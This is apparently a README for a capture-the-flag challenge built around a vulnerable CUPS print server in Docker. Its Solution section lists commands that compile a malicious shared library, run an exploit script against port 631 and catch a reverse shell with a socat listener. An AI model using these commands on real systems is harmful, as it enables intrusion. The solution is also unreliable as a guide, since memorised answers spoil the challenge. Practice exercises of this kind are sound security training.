# Spell ICUPS

```
I turned on a small CUPS server we found in the back for saving PDFs that we make locally. Didn't have SSH or anything, though, but thankfully it had socat.
```

## Documentation

Existing exploit, non-existent payload. Competitors have to make their own exploitative shared object library. Fun!

### Setup

1. docker build . -t spell-icups
2. docker run --rm -it spell-icups

## Solution

```
gcc exploit.c -o exploit.so -fPIC -shared -ldl
python exploit.py -a 172.30.0.2 -b 631 -c exploit.so
python exploit.py -a 172.30.0.2 -b 631 -f >/dev/null & socat file:`tty`,raw,echo=0 tcp-listen:4444
```
